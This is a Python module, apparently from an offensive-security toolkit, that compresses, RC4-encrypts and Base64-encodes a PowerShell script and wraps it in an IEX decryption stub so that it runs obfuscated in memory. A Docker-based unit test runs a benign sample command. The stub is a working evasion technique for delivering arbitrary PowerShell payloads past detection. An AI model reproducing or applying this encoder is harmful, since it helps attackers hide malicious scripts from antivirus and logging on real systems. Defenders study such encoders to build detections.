from lets.module import Module
from lets.extensions.docker import DockerExtension

# Imports required to execute this module
import os, gzip, base64, string
from Crypto.Cipher import ARC4
from Crypto.Hash import SHA256


class RC4(DockerExtension, Module):
    """
    Compress, RC4 encrypt and Base64 encode a powershell script and
    prepend a decode/decrypt/decompress stub.
    """

    def usage(self) -> object:
        """
        Configure an ArgumentParser object with options relevant to the module.

        :return: ArgumentParser object
        """
        parser = super().usage()

        # Set encryption parameters
        parser.add_argument("-k", "--key",
            help="key used for RC4 encryption",
            type=str)

        return parser

    def do(self, data:bytes=None, options:dict=None) -> bytes:
        """
        Main functionality.

        Module.do updates self.options with options.

        :param data: Data to be used by module, in bytes
        :param options: Dict of options to be used by module
        :return: Generator containing results of module execution, in bytes
        """
        super().do(data, options)

        # Validate input
        try:
            assert data, "Expecting data"
        except AssertionError as e:
            self.throw(e)

        # Normalize key
        if self.options.get("key"):
            key = SHA256.new(self.options.get("key").encode()).digest()
        else:
            key = os.urandom(32)

        # Compress command
        compressed = gzip.compress(data, compresslevel=9)

        # Encrypt command
        encrypted = ARC4.new(key).encrypt(compressed)

        # Encode command
        encoded = base64.b64encode(encrypted)
        self.options["encoded"] = encoded.decode()

        # Encode key
        encoded_key = base64.b64encode(key)
        self.options["encoded_key"] = encoded_key.decode()
        
        # Place encoded command in harness
        cmd = ("IEX "+

            # Read bytes from stream
            "(New-Object System.IO.StreamReader("+

            # Decompress stream
            "$(New-Object System.IO.Compression.GzipStream("+

            # Place bytes in stream
            "$(New-Object System.IO.MemoryStream("+

            # Decrypt bytes
            # ---------------
            ",$("+
            # RC4
            "& $({$D,$K=$Args;$S=0..255;0..255|%%{$J=($J+$S[$_]+$K[$_%%$K.Length])%%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%%{$I=($I+1)%%256;$H=($H+$S[$I])%%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%%256]}})"+
            # Param 0: Encrypted Data
            " $([System.Convert]::FromBase64String('%(encoded)s'))"+
            # Param 1: Key
            " $([System.Convert]::FromBase64String('%(encoded_key)s'))"+
            ")"
            # ---------------

            ")"+
            "),[System.IO.Compression.CompressionMode]::Decompress)"+
            "),[System.Text.Encoding]::UTF8)"+
            ").ReadToEnd()" % self.options

            ) % self.options

        # Convert harness to bytes and return
        yield cmd.encode()

    @DockerExtension.ImageDecorator(["mcr.microsoft.com/powershell:latest"])
    def test(self):
        """
        Perform unit tests to verify this module's functionality.
        """
        # Test key encoding
        self.assertTrue(
            b"IqSAUVlMGUne7XBAhQwfD4dkU39Rkb5Wcy0WpUwdgVM=" in 
            b"".join(self.do(bytes(range(0, 256)), {"key": "A"*32})),
            "Key encoding produced innacurate results")

        # Test execution
        test = string.ascii_letters + string.digits
        testcmd = "Write-Output '%s'" % test
        encoded = b"".join(self.do(testcmd.encode()))
        cmd = encoded.decode()

        with self.Container(
            image="mcr.microsoft.com/powershell:latest",
            network_disabled=True,
            entrypoint=["pwsh", "-c"],
            command=[cmd]) as container:

            # Fetch output
            output = [line.strip() for line in container.logs(stdout=True, stderr=True)][0]

            # Wait for container to cleanup
            container.wait()

            # Verify execution was successful
            self.assertEqual(output.decode(), test, "Execution produced inaccurate results")
